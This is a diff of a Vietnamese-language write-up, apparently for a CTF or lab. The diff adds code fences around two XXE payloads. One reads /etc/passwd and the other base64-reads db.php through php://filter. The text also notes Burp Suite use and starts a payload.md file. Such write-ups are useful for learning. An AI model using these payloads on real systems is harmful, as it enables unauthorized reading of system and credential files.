@@ -14,7 +14,9 @@ tìm thấy form
 
 sử dụng burp suite xem request post -> có thể bị xxe
 
+```html
 <!DOCTYPE title [<!ELEMENT title ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+```
 
 ![https://lh7-us.googleusercontent.com/vDvIu5wCOF-dOsWxSvGHooOhRbNLBALLQVqt17hH_IuUJZORdBoON-kjLNfsl2D4kfaRtUUHtOtQTpdn7YpSzECJzn4gXxfSzTwJBxz1KqQ1VuYslpsDrVKQ-JoYjo6TrK11QpUU6Nqf](https://lh7-us.googleusercontent.com/vDvIu5wCOF-dOsWxSvGHooOhRbNLBALLQVqt17hH_IuUJZORdBoON-kjLNfsl2D4kfaRtUUHtOtQTpdn7YpSzECJzn4gXxfSzTwJBxz1KqQ1VuYslpsDrVKQ-JoYjo6TrK11QpUU6Nqf)
 
@@ -34,7 +36,9 @@ file db.php đáng lưu ý, nhưng có vẻ ko đọc được
 
 thử payload khác, đọc được /etc/passwd -> thử đọc db.php
 
+```html
 <!DOCTYPE title [ <!ELEMENT title ANY > <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php" >]>
+```
 
 ![https://lh7-us.googleusercontent.com/oyH5jJl52TYnLjrE8hd4D30o3slm75K3HBk7K_ZGz8pr0fVwhQMocdR8xaW6p173--va8wqXW5fGv-fRl7-AeA4Br0bdtX7Py2YB3C5pn2OkPkuGOrEiCLFOU5lcaDHKIgbAMh7gEz7j](https://lh7-us.googleusercontent.com/oyH5jJl52TYnLjrE8hd4D30o3slm75K3HBk7K_ZGz8pr0fVwhQMocdR8xaW6p173--va8wqXW5fGv-fRl7-AeA4Br0bdtX7Py2YB3C5pn2OkPkuGOrEiCLFOU5lcaDHKIgbAMh7gEz7j)
 
@@ -159,7 +163,7 @@ phân tích đoạn mã trên:
 
 tạo file payload.md với nội dung như sau:
 
-```markdown
+```bash
 # Skytrain Inc
 
 ## Ticket to
